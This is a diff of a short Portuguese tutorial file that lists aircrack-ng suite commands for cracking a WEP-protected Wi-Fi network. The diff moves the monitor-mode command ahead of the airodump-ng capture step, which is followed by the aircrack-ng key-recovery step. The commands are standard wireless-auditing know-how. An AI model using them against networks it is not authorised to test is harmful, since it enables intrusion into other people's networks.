@@ -18,9 +18,9 @@ A ideia principal é:
 
 ### Alguns [comandos]
 
-#### Monitora rede que utiliza criptografia WEP no canal 2(neste exemplo)
-airodump-ng mon0 --encrypt WEP -w captura -u 2
 #### Coloca placa de rede sem fio no modo monitor
 airmon-ng start wlan0
+#### Monitora rede que utiliza criptografia WEP no canal 2(neste exemplo)
+airodump-ng mon0 --encrypt WEP -w captura -u 2
 #### Realiza o procedimento de quebra da senha
 aircrack-ng -z  -b <MAC DO AP>  <ARQUIVO>*.cap
